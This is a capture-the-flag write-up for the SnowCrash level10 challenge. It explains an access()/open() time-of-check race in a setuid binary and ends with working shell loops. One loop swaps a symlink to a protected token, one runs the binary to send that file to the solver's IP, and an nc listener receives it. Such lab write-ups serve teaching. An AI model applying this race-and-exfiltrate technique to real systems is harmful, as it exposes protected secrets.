# Research 

```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ cat token
cat: token: Permission denied
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```

```bash
level10@SnowCrash:~$ strings level10
[...]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
[...]
```
The progam seems to send a file to a host on its port 6969, once it is sent, it opens it, reads it, and write it.

We don't have permission to `cat token`, so maybe we can send token with `level10` program on a host, listen to the host's `6969` port and read the token once `level10` write it.

How do we do that?

`If you want to create a simple "test" server that can be set listen on a specified port and that you can interact with, take a look at the netcat command`
https://askubuntu.com/questions/301787/opening-a-port-for-listening

` [netcat] can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.`
`nc -l      Listen for an incoming connection rather than initiating a connection to a remote
             host.  The destination and port to listen on can be specified either as non-optional
             arguments, or with options -s and -p respectively.`
http://manpages.ubuntu.com/manpages/hirsute/en/man1/nc_openbsd.1.html


So we can start to execute level10 with token on our IP address: `./level10 token 10.12.0.0` but it does not work as we don't have access to token. </br>
Let's do a symlink on token: `ln -s /home/user/level10/token /tmp/final` and try `./level10 /tmp/final 10.12.0.0` -> It does not work as we don't have access to /tmp/final.</br>

`strings level10` shows that level10 does an access() then an open(). This is a security hole. 

`Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.`
https://linux.die.net/man/2/access

So we can do the symlink again and again, hoping that level10 will accept our file with access, then the symlink will occure, then level10 will open our modified file. 

# Solution

Level10 seems to be able to sends any file we create so let's do on a first terminal connected with ssh: `while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done` to create the file that is going to be the symlink. (`readlink -f token` to know the true path of token file). We need to suppress and create a new file each time or the symlink will apply on tmp/final and will not pass the access() check again.

On a second ssh terminal let's do: `while true; do (./level10 /tmp/final 10.11.200.134); done` to execute level10 in a loop.

On a third terminal, we can listen to the port 6969 with the netcat command: `while true; do nc -l 6969 ;done`
